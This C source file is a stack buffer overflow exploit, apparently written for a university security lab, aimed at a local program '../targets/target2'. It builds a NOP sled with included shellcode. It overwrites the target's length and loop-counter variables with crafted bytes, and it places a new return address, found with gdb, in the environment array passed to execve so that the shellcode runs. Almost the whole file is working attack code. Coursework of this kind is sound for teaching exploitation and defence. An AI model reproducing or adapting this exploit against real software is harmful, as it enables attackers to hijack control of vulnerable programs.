#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target2"

// from gdb, we know the following addr
// start of the stack for foo: 0x3021fe98
// start of the buf: 0x3021fd80
// len is stored at 0x3021fe88
// i is stored at 0x3021fe8c
#define SHELL_SIZE 45
#define NOP 0x90
#define BUF_SIZE 0x11d
#define ADDR 0x3021fd80
int
main ( int argc, char * argv[] )
{
	char *	args[3];
	char *	env[6];
    char *ptr;
    char buff[BUF_SIZE];
    int* int_ptr;
    int i;

    ptr = buff;

    // *int_ptr = BUF_SIZE; // overwrite len variable in foo()

    for (i = 0; i < BUF_SIZE; i++)
        buff[i] = NOP;
    
    // change len to 284
    buff[264] = '\x1c';
    buff[265] = '\x01';
    buff[266] = '\0';

    for (i = 0; i < SHELL_SIZE; i++)
        *(ptr++) = shellcode[i];

    int_ptr = (int*) &buff[280];
    // *int_ptr = ADDR;
    buff[BUF_SIZE - 1] = '\0';

	args[0] = TARGET;
	args[1] = buff;
	args[2] = NULL;

    env[0] = "\x00"; // fill in the missing \x00 for len
    env[1] = "\x0c\x01"; // replace i with the correct counter
    env[2] = "\x00";
    // garbage string with null terminator at the end to make 8 bytes to fill between i and RA
    env[3] = "awe"; 
    env[4] = "123";
    // new return addr
    env[5] = "\x80\xfd\x21\x30";

	if ( execve (TARGET, args, env) < 0 )
		fprintf (stderr, "execve failed.\n");

	return (0);
}
